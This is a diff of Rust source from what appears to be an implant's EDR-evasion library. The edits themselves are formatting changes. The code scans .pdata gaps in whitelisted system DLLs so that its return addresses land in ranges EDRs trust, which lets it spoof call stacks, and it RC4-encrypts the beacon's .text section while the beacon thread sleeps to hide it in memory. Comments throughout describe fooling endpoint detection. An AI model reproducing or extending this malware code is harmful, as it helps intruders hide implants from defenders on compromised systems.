@@ -15,7 +15,10 @@
 
 use crate::resolve;
 use nyx_implant_evasionsdk::gap;
-use nyx_implant_evasionsdk::{BlindKit, BlindTarget, EvasionError, GapPool, MaskToken, MemoryMaskKit, PdataGapScanner, StackSpoofKit, SpoofGuard};
+use nyx_implant_evasionsdk::{
+    BlindKit, BlindTarget, EvasionError, GapPool, MaskToken, MemoryMaskKit, PdataGapScanner,
+    SpoofGuard, StackSpoofKit,
+};
 
 /// Cap on how many 8-byte-aligned gap anchors we sample per inter-function /
 /// tail range. Keeps the `GapPool` bounded (a raw ntdll has ~3900 RUNTIME_
@@ -27,12 +30,7 @@ const MAX_PER_GAP: usize = 8;
 /// (all are always-present, signed, system modules — EDRs trust frames whose
 /// return addresses land in their export ranges). `win32u.dll`/`wow64.dll` are
 /// absent on some builds; a missing module is skipped, not fatal.
-const WHITELIST: &[&[u8]] = &[
-    b"ntdll.dll",
-    b"kernelbase.dll",
-    b"win32u.dll",
-    b"wow64.dll",
-];
+const WHITELIST: &[&[u8]] = &[b"ntdll.dll", b"kernelbase.dll", b"win32u.dll", b"wow64.dll"];
 
 /// Real `.pdata` gap scanner: PEB-walk each whitelisted DLL, read its
 /// exception directory via [`resolve::pdata_view`], run the pure gap core
@@ -74,9 +72,8 @@ impl PdataGapScanner for LivePdataScanner {
             //
             // SAFETY: the whole module image is mapped readable; reading one
             // byte at an in-range RVA is sound.
-            let image_bytes = unsafe {
-                core::slice::from_raw_parts(base, view.image_size as usize)
-            };
+            let image_bytes =
+                unsafe { core::slice::from_raw_parts(base, view.image_size as usize) };
             let mut per_module = gap::classify_into_pool(
                 &gaps,
                 Some(image_bytes),
@@ -110,7 +107,9 @@ impl PdataGapScanner for LivePdataScanner {
                         return false;
                     }
                     let b = img[off];
-                    b == 0x90 || b == 0xCC || b == 0x00
+                    b == 0x90
+                        || b == 0xCC
+                        || b == 0x00
                         || (b == 0x66 && off + 1 < img.len() && img[off + 1] == 0x90)
                 },
             );
@@ -137,7 +136,9 @@ impl PdataGapScanner for LivePdataScanner {
         if !pool.is_usable() {
             // No gaps anywhere = something is badly wrong (every Win10/11/Server
             // ntdll has thousands). Surface it rather than silently degrade.
-            return Err(EvasionError::Unresolved("no .pdata gaps on any whitelisted DLL"));
+            return Err(EvasionError::Unresolved(
+                "no .pdata gaps on any whitelisted DLL",
+            ));
         }
         // LACUNA layer 5: populate the `backed` pool with real `.pdata`-covered
         // ntdll/kernelbase function addresses to use as chain terminators. These
@@ -278,7 +279,9 @@ impl MemoryMaskKit for LiveMemoryMask {
         // Flip RX→RW then RC4-encrypt. SAFETY: caller guarantees we're in the
         // Foliage helper context — the beacon thread is parked in alertable
         // sleep, NOT executing .text.
-        unsafe { crate::mem::mask_text(region.base, region.len, &key); }
+        unsafe {
+            crate::mem::mask_text(region.base, region.len, &key);
+        }
         Ok(MaskToken::new(region.base, region.len, key))
     }
 
